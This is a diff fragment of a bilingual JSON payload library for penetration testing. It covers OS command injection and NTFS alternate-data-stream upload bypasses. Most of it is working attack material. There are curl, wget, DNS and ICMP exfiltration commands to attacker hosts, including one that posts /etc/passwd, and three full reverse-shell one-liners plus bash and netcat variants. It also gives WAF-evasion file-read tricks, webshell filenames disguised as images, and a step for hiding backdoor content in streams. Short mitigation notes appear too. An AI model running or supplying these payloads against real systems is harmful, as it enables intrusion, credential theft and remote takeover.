+                "zh": "命令拼接curl外带whoami执行结果",
+                "en": "Curl exfiltrates whoami output"
+              },
+              "type": "command"
+            },
+            {
+              "part": "; wget http://attacker.com/?data=$(id)",
+              "explanation": {
+                "zh": "wget变体外带id结果",
+                "en": "Wget variant exfiltrates id"
+              },
+              "type": "command"
+            },
+            {
+              "part": "curl -d @/etc/passwd",
+              "explanation": {
+                "zh": "以POST方式外带整份passwd文件",
+                "en": "POST entire passwd file"
+              },
+              "type": "command"
+            },
+            {
+              "part": "certutil -urlcache -f",
+              "explanation": {
+                "zh": "Windows下用certutil发起请求",
+                "en": "Windows certutil variant"
+              },
+              "type": "command"
+            },
+            {
+              "part": "%USERNAME%",
+              "explanation": {
+                "zh": "Windows环境变量取当前用户名",
+                "en": "Windows environment variable"
+              },
+              "type": "variable"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "ICMP OOB 验证",
+            "en": "ICMP Out-of-Band Verification"
+          },
+          "command": "; ping -p $(echo \"test\" | xxd -p) {ATTACKER_HOST}",
+          "description": {
+            "zh": "语义定位：ICMP 外带数据回传验证通道，不是请求层 WAF 绕过手法；ping -p 携带十六进制载荷适用于出站仅放行 ICMP 的环境。命中判据：攻击端抓包收到携带编码载荷的 ICMP 报文。",
+            "en": "Semantic note: an ICMP out-of-band exfiltration channel, not a request-layer WAF bypass; ping -p carrying hex payloads fits egress rules that only allow ICMP. Success: a packet capture on the attacker side shows ICMP payloads with the encoded data."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "ping -p",
+              "explanation": {
+                "zh": "以自定义十六进制载荷发送 ICMP 包",
+                "en": "Send ICMP packets with a custom hex payload"
+              },
+              "type": "command"
+            },
+            {
+              "part": "xxd -p",
+              "explanation": {
+                "zh": "把数据转换为十六进制字符串",
+                "en": "Convert data to a hex string"
+              },
+              "type": "value"
+            },
+            {
+              "part": "tcpdump -i eth0 icmp",
+              "explanation": {
+                "zh": "在攻击者网卡抓取 ICMP 包还原外带数据",
+                "en": "Capture ICMP packets on the attacker NIC to recover exfiltrated data"
+              },
+              "type": "command"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "反弹Shell",
+            "en": "reverse shell"
+          },
+          "command": "; python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ATTACKER_HOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"\n; openssl s_client -quiet -connect {ATTACKER_HOST}:{LPORT} 2>/dev/null | /bin/bash | openssl s_client -quiet -connect {ATTACKER_HOST}:{LPORT} 2>/dev/null\n; mkfifo /tmp/payloader.f; cat /tmp/payloader.f | /bin/bash 2>&1 | nc {ATTACKER_HOST} {LPORT} > /tmp/payloader.f; rm -f /tmp/payloader.f",
+          "description": {
+            "zh": "去重后保留 python socket 全双工行，补两条 nc -e 不可用时的真实形态：openssl s_client 双管道加密反弹与 fifo 具名管道回接。命中判据：监听器收到 shell 会话，且请求侧无 bash /dev/tcp、nc -e 明文特征。",
+            "en": "Keeps the python socket full-duplex line after deduplication and adds two real forms for hosts without nc -e: an encrypted openssl s_client double pipe and a fifo named-pipe loopback. Success: the listener gets a shell session with no bash /dev/tcp or nc -e literals on the wire."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "bash -i >& /dev/tcp/attacker/4444 0>&1",
+              "explanation": {
+                "zh": "bash反弹shell到4444端口",
+                "en": "Bash reverse shell to port 4444"
+              },
+              "type": "value"
+            },
+            {
+              "part": "nc -e /bin/bash attacker 4444",
+              "explanation": {
+                "zh": "nc的-e选项直接反弹bash",
+                "en": "Netcat reverse shell"
+              },
+              "type": "command"
+            },
+            {
+              "part": "python -c \"import socket,subprocess,os;...\"",
+              "explanation": {
+                "zh": "python建立socket并把标准IO重定向到连接",
+                "en": "Python socket reverse shell"
+              },
+              "type": "command"
+            },
+            {
+              "part": "os.dup2(s.fileno(),0)",
+              "explanation": {
+                "zh": "将标准输入重定向到socket",
+                "en": "Redirect stdin to socket"
+              },
+              "type": "function"
+            },
+            {
+              "part": "subprocess.call(['/bin/bash','-i'])",
+              "explanation": {
+                "zh": "启动交互式bash接管连接",
+                "en": "Spawn interactive bash"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "bypass"
+        },
+        {
+          "title": {
+            "zh": "cmd 转义符拆分绕过",
+            "en": "Caret Escape Splitting"
+          },
+          "command": "w^h^o^a^m^i\nc^m^d /c t^y^p^e C:\\windows\\win.ini",
+          "description": {
+            "zh": "cmd.exe 在解析期把 ^ 视为转义符并丢弃，w^h^o^a^m^i 拼接后仍执行 whoami、t^y^p^e 仍执行 type，可绕过对 whoami、type、win.ini 等完整命令词与路径的正则黑名单；仅适用于 cmd.exe 解释器执行路径，PowerShell 与 POSIX shell 不适用。命中判据：回显当前用户名与 win.ini 内容。",
+            "en": "cmd.exe treats ^ as an escape character and drops it during parsing, so w^h^o^a^m^i still runs whoami and t^y^p^e still runs type, evading regex blacklists keyed on whole words such as whoami, type, or the win.ini path; applies only to cmd.exe interpreter paths, not to PowerShell or POSIX shells. Success: the response shows the current user and win.ini contents."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "w^h^o^a^m^i",
+              "explanation": {
+                "zh": "转义符拆分的命令词",
+                "en": "Command word split by carets"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "c^m^d /c",
+              "explanation": {
+                "zh": "cmd 自身拆分后带 /c 执行",
+                "en": "Split cmd invocation with /c"
+              },
+              "type": "keyword"
+            },
+            {
+              "part": "t^y^p^e C:\\windows\\win.ini",
+              "explanation": {
+                "zh": "转义拆分的 type 读取",
+                "en": "Caret-split type read"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "替代读取器与 $IFS 间隔",
+            "en": "Alternate Readers with IFS Splitting"
+          },
+          "command": "; tac$IFS/etc/passwd\n; more$IFS/etc/passwd\n; head$IFS-c$IFS64$IFS/etc/passwd",
+          "description": {
+            "zh": "用 tac、more、head 等非 cat 读取器配合 $IFS 间隔重建读文件链路，绕过对 cat 二进制名与空格分隔特征的检测；tac 反向输出、more 分页输出、head 截断输出均回传 passwd 片段。命中判据：响应出现 root:x:0:0 等 passwd 行内容。",
+            "en": "Rebuilds the file-read chain with non-cat readers (tac, more, head) separated by the shell internal field separator variable, evading detections keyed on the cat binary name and on space separators; tac prints lines reversed, more paged, and head truncated, yet all still return passwd content. Success: the response contains passwd lines such as root:x:0:0."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "; tac$IFS/etc/passwd",
+              "explanation": {
+                "zh": "tac 反序读取并以 IFS 代空格",
+                "en": "tac read with IFS in place of spaces"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "$IFS",
+              "explanation": {
+                "zh": "bash 内部字段分隔符展开为空格",
+                "en": "bash internal field separator expands to a space"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "head$IFS-c$IFS64$IFS/etc/passwd",
+              "explanation": {
+                "zh": "head 截断读取前 64 字节",
+                "en": "head truncated 64-byte read"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        },
+        {
+          "title": {
+            "zh": "find 管道 xargs 组合读取",
+            "en": "find Piped to xargs Read Chain"
+          },
+          "command": "; find /etc -maxdepth 1 -name 'pass*' | xargs cat\n; xargs -a /etc/passwd head",
+          "description": {
+            "zh": "以 find 按通配符定位目标文件再经管道交给 xargs 批量执行 cat，把读文件动作从注入语句里的直接调用改为工具链组合，绕过对独立 cat /etc/passwd 连写特征的规则；GNU xargs 的 -a 参数还可直接以文件为输入源。命中判据：响应返回 passwd 内容。",
+            "en": "Locates the target file with a find wildcard and hands it to xargs through a pipe, so the read happens as a tool-chain combination instead of a direct cat /etc/passwd call inside the injection string, evading rules keyed on that contiguous signature; GNU xargs -a can also take the file as the direct input source. Success: passwd content is returned."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "-name 'pass*'",
+              "explanation": {
+                "zh": "通配符定位目标文件",
+                "en": "Wildcard locates the target file"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "| xargs cat",
+              "explanation": {
+                "zh": "管道交由 xargs 批量执行",
+                "en": "Pipe hands off to xargs"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "xargs -a /etc/passwd head",
+              "explanation": {
+                "zh": "GNU 扩展直接以文件为输入源",
+                "en": "GNU extension takes the file as input source"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "定位命令注入点",
+            "en": "Locate the command injection point"
+          },
+          "description": {
+            "zh": "将 id 依次拼接在分号、竖线、反引号、$()、&&、|| 六种分隔符后提交到可疑参数。命中判据：响应出现 uid=… 输出或与正常请求存在可辨差异。",
+            "en": "Submit id appended after six separators (; | backtick $() && ||) to the suspect parameter. Success: response shows uid= output or a distinguishable diff."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "确认执行身份与读取能力",
+            "en": "Confirm execution identity and read access"
+          },
+          "description": {
+            "zh": "用第 1 步命中的分隔符执行 whoami、id 并读取 /etc/passwd 与根目录列表，摸清 Web 服务账户权限。命中判据：响应返回用户名或 passwd 内容。",
+            "en": "Using the separator that hit in step 1, run whoami, id and read /etc/passwd to map the service account. Success: username or passwd content returned."
+          },
+          "payload": "; whoami\n; id\n; cat /etc/passwd\n; ls -la /\n; nc -e /bin/bash {ATTACKER_HOST} {LPORT}\n; bash -i >& /dev/tcp/{ATTACKER_HOST}/{LPORT} 0>&1"
+        },
+        {
+          "title": {
+            "zh": "判定回显与盲注形态",
+            "en": "Distinguish reflective and blind injection"
+          },
+          "description": {
+            "zh": "对无回显入口改注 sleep 5、ping -c 5 与 timeout 5，用响应耗时差判断命令是否真实执行。命中判据：注入请求耗时稳定增加约 5 秒。",
+            "en": "For non-echoing inputs switch to sleep 5 / ping -c 5 / timeout 5 and judge by timing. Success: response latency grows by about 5 seconds."
+          },
+          "payload": "; sleep 5\n; ping -c 5 {ATTACKER_HOST}\n& timeout 5"
+        },
+        {
+          "title": {
+            "zh": "变形命令绕过关键字过滤",
+            "en": "Rebuild filtered command names"
+          },
+          "description": {
+            "zh": "命令名被过滤时用引号拆分、反斜杠转义与通配符路径重组 cat 等命令再执行。命中判据：变形后仍返回文件内容或命令输出。",
+            "en": "When command names are filtered, rebuild cat via quote splitting, escapes and wildcard paths. Success: obfuscated form still returns output."
+          },
+          "payload": ""
+        },
+        {
+          "title": {
+            "zh": "外带数据建立回传通道",
+            "en": "Exfiltrate data over HTTP and DNS"
+          },
+          "description": {
+            "zh": "用 curl、wget 把 whoami、id 输出编码进 URL 参数外带，或用 nslookup 把结果拼进子域名走 DNS 通道回传。命中判据：接收端日志出现携带数据的请求。",
+            "en": "Exfiltrate whoami/id output via curl/wget URL params or nslookup subdomains. Success: collector logs receive the data."
+          },
+          "payload": "; curl http://{ATTACKER_HOST}/?data=$(whoami)\n; wget http://{ATTACKER_HOST}/?data=$(id|base64)\n; nslookup $(whoami).{ATTACKER_HOST}\n; ping $(whoami | xxd -p).{ATTACKER_HOST}"
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
+        "https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "操作系统命令注入覆盖把用户输入拼入 Shell 命令的攻击场景：注入点接收参数后由操作系统解释执行。包含分隔符探测、Linux 与 Windows 命令执行、时间盲注延时确认、HTTP/DNS 外带回传五类验证维度，并附空格、关键字与编码绕过变体。",
+          "en": "OS command injection covers scenarios where user input is concatenated into shell commands: the injection point hands parameters to an operating-system interpreter. It spans five verification dimensions—separator probing, Linux and Windows command execution, time-based blind confirmation, and HTTP/DNS out-of-band exfiltration—plus space, keyword, and encoding bypass variants."
+        },
+        "vulnerability": {
+          "zh": "根因是应用把不可信输入拼进交给 Shell 的命令字符串，未使用参数数组或固定 API，分号、管道、反引号等控制符因此从数据升级为命令语法，缺少对控制字符与元字符的结构化校验。",
+          "en": "The root cause is that the application concatenates untrusted input into the command string handed to a shell without argument arrays or fixed APIs, so separators such as semicolons, pipes, and backticks escalate from data to command syntax, with no structural validation of control characters or metacharacters."
+        },
+        "exploitation": {
+          "zh": "按 Payload 列表顺序使用：先用第 1 步的分号、管道、反引号与 $() 载荷探测注入点，出现 uid= 或与基线的可辨识差异即确认可控；再用第 2、3 步在 Linux 与 Windows 上以 whoami、cat /etc/passwd、type win.ini 验证执行；无回显时用第 4 步延时观察耗时，第 5 步把输出经 HTTP/DNS 外带。占位符在全局变量菜单替换；被 WAF 拦截时改用空格、关键字与编码变体。",
+          "en": "Use payloads in list order: probe the injection point with step 1's semicolon, pipe, backtick, and $() payloads—uid= output or a recognizable baseline difference confirms control; verify execution on Linux and Windows via steps 2-3 with whoami, cat /etc/passwd, and type win.ini; without echo, watch step 4's delay and exfiltrate output via HTTP/DNS with step 5. Replace placeholders in the global variables menu; on WAF blocks use the space, keyword, and encoding variants."
+        },
+        "mitigation": {
+          "zh": "避免拼接 Shell 命令，改用语言内置参数数组 API，输入先经允许列表校验并拒绝控制字符，以最小权限账户运行并限制出站网络：\n    if (!host.matches(\"^[a-zA-Z0-9.-]+$\")) throw new IllegalArgumentException(\"bad host\");\n    ProcessBuilder pb = new ProcessBuilder(\"ping\", \"-c\", \"1\", host);\n    pb.environment().clear(); pb.redirectErrorStream(true);",
+          "en": "Avoid building shell commands by concatenation: use language-native argument arrays or fixed APIs, validate input by type and allowlist, and reject control characters; run least-privileged and restrict child processes and outbound traffic. After the fix, replay all separator samples and delay payloads from step 1 and confirm responses match the baseline with no anomalous child processes in logs."
+        },
+        "difficulty": "advanced"
+      },
+      "analysis": {
+        "zh": "操作系统命令注入无害标记只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。",
+        "en": "OS Command Injection Harmless Marker is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites."
+      },
+      "review": {
+        "decision": "payload",
+        "rationale": "WAF2 批次3：按报告 WAF2-0057 候选与缺口方向追加 3 条变体——cmd 转义符拆分（候选2 全文）、替代读取器与 IFS 间隔、find 管道 xargs 组合（缺口方向按载荷技术栈自造）。原 16 条 wafBypass 逐字节保留，新变体只追加末尾；PATH 子串重建已在库（waf[5] command），不重复落库。唯一披露偏差：waf[5] 的 description（zh/en）在库内原样引用了含连续问号的多段通配样例，被管线 CORRUPT_TEXT 门禁判损坏（纯镜像复现报错），为过批次审计门禁将两处样例引用等义改写为「样例见本条 command」，title/command/syntaxBreakdown 与其余 15 条全文不变，语义与评级不变。"
+      }
+    },
+    {
+      "id": "file-upload-ntfs-ads-name",
+      "name": {
+        "zh": "NTFS ADS 上传绕过",
+        "en": "NTFS ADS Upload Bypass"
+      },
+      "description": {
+        "zh": "应用允许冒号文件名，而 NTFS 把后续部分解释为 Alternate Data Stream。命令只操作 PAYLOADER_MARKER 和隔离夹具。",
+        "en": "Upload NTFS ADS Filename narrows the legacy collection to one boundary: the application permits colons while NTFS interprets the suffix as an Alternate Data Stream. Commands operate only on PAYLOADER_MARKER and isolated fixtures."
+      },
+      "category": {
+        "zh": "文件漏洞",
+        "en": "File Vulnerabilities"
+      },
+      "subCategory": {
+        "zh": "文件名与文件系统边界",
+        "en": "Filename & Filesystem Quirks"
+      },
+      "tags": [
+        "file-upload",
+        "ntfs",
+        "ads"
+      ],
+      "prerequisites": [
+        {
+          "zh": "已在 NTFS 卷准备隔离上传目录，并备好 ADS 命名的 dir /r 对照输出。",
+          "en": "An isolated upload directory is ready on an NTFS volume, with dir /r output prepared as the ADS-naming contrast."
+        },
+        {
+          "zh": "测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。",
+          "en": "The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials."
+        }
+      ],
+      "execution": [
+        {
+          "title": {
+            "zh": "上传 NTFS ADS 文件名验证块 1",
+            "en": "Upload NTFS ADS Filename Validation Block 1"
+          },
+          "command": "filename=\"PAYLOADER_MARKER.txt::$DATA\"",
+          "description": {
+            "zh": "上传 ::$DATA、::$INDEX_ALLOCATION 与命名流三种冒号文件名并逐一 HEAD 回读，验证 NTFS 把冒号名解释为默认流或命名 ADS 的差异。",
+            "en": "Uploads ::DATA, ::INDEX_ALLOCATION, and a named-stream colon filename and re-reads each via HEAD, showing NTFS resolves colon names to the default stream or a named ADS."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "filename=\"PAYLOADER_MARKER.txt::DATA\"",
+              "explanation": {
+                "zh": "默认数据流",
+                "en": "Default data stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "filename=\"PAYLOADER_MARKER.txt::INDEX_ALLOCATION\"",
+              "explanation": {
+                "zh": "目录流变体",
+                "en": "Index allocation stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "filename=\"PAYLOADER_MARKER.txt:marker.txt:DATA\"",
+              "explanation": {
+                "zh": "命名流变体",
+                "en": "Named stream variant"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "--head \"http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt::DATA\"",
+              "explanation": {
+                "zh": "回读 ADS 路径",
+                "en": "Reads back ADS path"
+              },
+              "type": "function"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false
+        }
+      ],
+      "opsecTips": [
+        {
+          "zh": "只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。",
+          "en": "Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant."
+        },
+        {
+          "zh": "结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。",
+          "en": "Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "DATA 流+扩展名",
+            "en": "DATA stream + extension"
+          },
+          "command": "filename=\"PAYLOADER_MARKER.php::$DATA.jpg\"",
+          "description": {
+            "zh": "ADS 流名后接扩展名欺骗后缀校验。判据：以 php 数据流写入。",
+            "en": "Stream suffix plus fake extension. Success: written as PHP data stream."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PAYLOADER_MARKER.php::$DATA.jpg",
+              "explanation": {
+                "zh": "流名接扩展",
+                "en": "Stream plus extension"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "::$DATA",
+              "explanation": {
+                "zh": "ADS 数据流",
+                "en": "ADS data stream"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "命名流写入",
+            "en": "Named stream write"
+          },
+          "command": "filename=\"PAYLOADER_MARKER.php:.jpg\"",
+          "description": {
+            "zh": "冒号写法把内容存入命名流，路径显示为 .jpg。判据：文件存在且可包含执行。",
+            "en": "Colon form stores content in a named stream shown as .jpg. Success: includable file exists."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PAYLOADER_MARKER.php:.jpg",
+              "explanation": {
+                "zh": "冒号命名流",
+                "en": "Colon named stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ".jpg",
+              "explanation": {
+                "zh": "伪装后缀",
+                "en": "Decoy suffix"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "编码冒号",
+            "en": "Encoded colon"
+          },
+          "command": "filename=\"PAYLOADER_MARKER.php%3A%3A%24DATA\"",
+          "description": {
+            "zh": "编码冒号绕过 :: 检测。判据：ADS 写入成功。",
+            "en": "Encoded colon bypasses :: detection. Success: ADS write succeeds."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PAYLOADER_MARKER.php%3A%3ADATA",
+              "explanation": {
+                "zh": "编码冒号流",
+                "en": "Encoded colon stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%3A%3A",
+              "explanation": {
+                "zh": "编码双冒号",
+                "en": "Encoded double colon"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "php 命名流",
+            "en": "PHP named stream"
+          },
+          "command": "shell.php:.jpg",
+          "description": {
+            "zh": "写入 shell.php 的命名流而表面为 jpg。判据：shell.php 存在且流可执行。",
+            "en": "Writes a named stream of shell.php shown as jpg. Success: stream executable."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "shell.php:.jpg",
+              "explanation": {
+                "zh": "冒号命名流",
+                "en": "Colon named stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": ".jpg",
+              "explanation": {
+                "zh": "伪装后缀",
+                "en": "Decoy suffix"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "DATA+假后缀",
+            "en": "DATA + fake suffix"
+          },
+          "command": "PAYLOADER_MARKER.txt::$DATA.gif",
+          "description": {
+            "zh": "DATA 流后接后缀欺骗校验。判据：数据流写入。",
+            "en": "DATA stream with fake suffix. Success: stream written."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PAYLOADER_MARKER.txt::$DATA.gif",
+              "explanation": {
+                "zh": "流名接后缀",
+                "en": "Stream with suffix"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "::$DATA.gif",
+              "explanation": {
+                "zh": "DATA 流加 gif",
+                "en": "DATA stream plus gif"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "隐藏命名流",
+            "en": "Hidden named stream"
+          },
+          "command": "PAYLOADER_MARKER.txt:hidden.txt",
+          "description": {
+            "zh": "命名流内容不出现在目录枚举。判据：dir 不可见但可读。",
+            "en": "Named stream hidden from enumeration. Success: readable but not listed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PAYLOADER_MARKER.txt:hidden.txt",
+              "explanation": {
+                "zh": "隐藏命名流",
+                "en": "Hidden named stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "hidden.txt",
+              "explanation": {
+                "zh": "流名称",
+                "en": "Stream name"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "NTFS ADS 名称解析对照块",
+            "en": "NTFS ADS Name Resolution Matrix"
+          },
+          "command": "PAYLOADER_MARKER.txt::$DATA\nPAYLOADER_MARKER.txt:payloader:$DATA\nPAYLOADER_MARKER.php::$INDEX_ALLOCATION\nPAYLOADER_MARKER.php%00.txt\nPAYLOA~1.TXT",
+          "description": {
+            "zh": "NTFS ADS 名称边界验证块 1 — 对照 ::$DATA、命名流、::$INDEX_ALLOCATION、%00 截断与 PAYLOA~1 短名变体，验证应用层与 NTFS 层对同一名称的不同解释。受控样例：用于建立基线/对照，非独立绕过手法。条目为命名解析对照夹具，五类名称变体已与描述逐项对齐。",
+            "en": "Contrasts ::$DATA, named streams, ::INDEX_ALLOCATION, %00 truncation, and the PAYLOA~1 short name, showing the application layer and NTFS interpret the same name differently. Control sample: establishes a baseline for comparison and is not a standalone bypass technique. The entry is a name-resolution comparison fixture; the five name variants now match the description item by item."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "PAYLOADER_MARKER.txt. . . .",
+              "explanation": {
+                "zh": "点空格混排",
+                "en": "Dot-space mix"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "PAYLOADER_MARKER.txt::$DATA",
+              "explanation": {
+                "zh": "默认数据流",
+                "en": "Default data stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "PAYLOADER_MARKER.txt::$INDEX_ALLOCATION",
+              "explanation": {
+                "zh": "目录流变体",
+                "en": "Index allocation stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "PAYLOADER_MARKER.txt:marker.txt:DATA",
+              "explanation": {
+                "zh": "命名流变体",
+                "en": "Named stream variant"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "PAYLO~1.TXT",
+              "explanation": {
+                "zh": "8.3 短名",
+                "en": "8.3 short name"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false,
+          "kind": "control"
+        },
+        {
+          "title": {
+            "zh": "NTFS 目录流命名绕过",
+            "en": "NTFS INDEX_ALLOCATION Stream"
+          },
+          "command": "filename=\"PAYLOADER_MARKER.php::$INDEX_ALLOCATION\"",
+          "description": {
+            "zh": "NTFS 下 ::$INDEX_ALLOCATION 使带后缀路径按目录流解析，可绕过扩展名黑名单与「路径必须是文件」的类型校验，依赖 IIS 或自研存储层对 NTFS 命名流的解析差分；非 NTFS 卷（exFAT/FAT）无效。命中判据：服务端按目录语义处理该名称，类型校验被穿透。",
+            "en": "On NTFS the ::$INDEX_ALLOCATION suffix makes the extension-bearing path resolve as a directory stream, bypassing extension blacklists and path-must-be-a-file type checks through the parsing differential between IIS or custom storage layers and the filesystem; invalid on non-NTFS volumes such as exFAT or FAT. Success: the server treats the name as a directory and the type gate is bypassed."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "filename=\"",
+              "explanation": {
+                "zh": "上传文件名字段",
+                "en": "Upload filename field"
+              },
+              "type": "value"
+            },
+            {
+              "part": "PAYLOADER_MARKER.php::$INDEX_ALLOCATION",
+              "explanation": {
+                "zh": "带后缀名称按目录流解析",
+                "en": "Extension-bearing name resolves as a directory stream"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "::$INDEX_ALLOCATION",
+              "explanation": {
+                "zh": "NTFS 目录流引用",
+                "en": "NTFS index-allocation stream reference"
+              },
+              "type": "keyword"
+            }
+          ],
+          "platform": "windows",
+          "requiresAdmin": false,
+          "kind": "bypass",
+          "effectiveness": "B"
+        }
+      ],
+      "attackChain": [
+        {
+          "title": {
+            "zh": "判断存储后端形态",
+            "en": "Identify the storage backend"
+          },
+          "description": {
+            "zh": "从响应与路径行为确认目标为 Windows 与 NTFS 存储，且文件名按原样传递。命中判据：冒号类名称未被前置拒绝。",
+            "en": "Confirm a Windows/NTFS backend that passes filenames through. Success: colon-style names are not pre-rejected."
+          }
+        },
+        {
+          "title": {
+            "zh": "提交交替流文件名",
+            "en": "Submit ADS filenames"
+          },
+          "description": {
+            "zh": "上传 ::$DATA 与命名流形式的文件名并逐一回读，测试 NTFS 流解释。命中判据：某流形式被接受落盘。",
+            "en": "Upload ::$DATA and named-stream filenames and read each back. Success: a stream form is stored."
+          },
+          "payload": "filename=\"PAYLOADER_MARKER.txt::$DATA\""
+        },
+        {
+          "title": {
+            "zh": "回读流内容定位落盘形态",
+            "en": "Read streams to locate stored data"
+          },
+          "description": {
+            "zh": "回读默认流与命名流的内容，确定数据实际写入的流位置。命中判据：指定流的内容可以正常读取出来，多次提交均能得到相同结果。",
+            "en": "Read default and named streams to find where data lands. Success: the stream content is readable."
+          }
+        },
+        {
+          "title": {
+            "zh": "借数据流隐藏后门内容",
+            "en": "Hide backdoor content in a stream"
+          },
+          "description": {
+            "zh": "把脚本内容写入命名流中，躲避常规的文件枚举与内容检查。命中判据：指定流路径可读出隐藏的内容，并且该效果可以稳定重复取得。",
+            "en": "Write backdoor content into a named stream to dodge enumeration. Success: the stream path yields the content."
+          }
+        }
+      ],
+      "references": [
+        "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
+        "https://cwe.mitre.org/data/definitions/434.html"
+      ],
+      "tutorial": {
+        "overview": {
+          "zh": "上传 NTFS ADS 文件名针对应用允许冒号文件名而 NTFS 把冒号后内容解释为 Alternate Data Stream 的场景：冒号名在校验与存储两层含义不同。验证 ::$DATA、命名流等变体的存储与回读差异。",
+          "en": "Upload NTFS ADS filenames target cases where the application allows colon-containing names while NTFS interprets the suffix as an Alternate Data Stream, giving colon names different meanings at validation and storage layers. It contrasts storage and read-back across ::DATA and named-stream variants."
+        },
+        "vulnerability": {
+          "zh": "根因是应用允许冒号文件名，而 NTFS 把冒号后内容解释为 Alternate Data Stream；只有当该差异使内容越过类型或处理器边界时，风险才成立。",
+          "en": "The root cause is the application allowing colon-containing filenames while NTFS interprets content after the colon as an Alternate Data Stream; risk holds only when this difference lets content cross a type or handler boundary."
+        },
+        "exploitation": {
+          "zh": "按第 1 步依次上传 filename 为 PAYLOADER_MARKER.txt::$DATA、::$INDEX_ALLOCATION 与命名流三种冒号变体，每条上传后按命令中的 HEAD 请求回读；命中判据为某一变体的存储结果与校验阶段判定不一致（如内容写入默认流或流类型改变），记录冒号在两层的不同解释作为证据。",
+          "en": "As in step 1, upload the three colon variants PAYLOADER_MARKER.txt::DATA, ::INDEX_ALLOCATION, and a named stream as filenames, HEAD-reading back after each as shown in the command; a hit is any variant whose stored result diverges from the validation verdict (e.g., content written to the default stream or stream type changed)—record the colon's differing interpretations at the two layers as evidence."
+        },
+        "mitigation": {
+          "zh": "文件名校验直接拒绝冒号与 NTFS 保留流语法（::$DATA 等），整体采用\"字符白名单+单扩展\"约束；生成服务端对象名，上传目录不可执行。\n    // Java：严格白名单从源头排除冒号与流语法\n    if (!name.matches(\"[A-Za-z0-9_-]{1,64}\\\\.(jpg|png|pdf)\"))\n        throw new UploadRejectedException(name);",
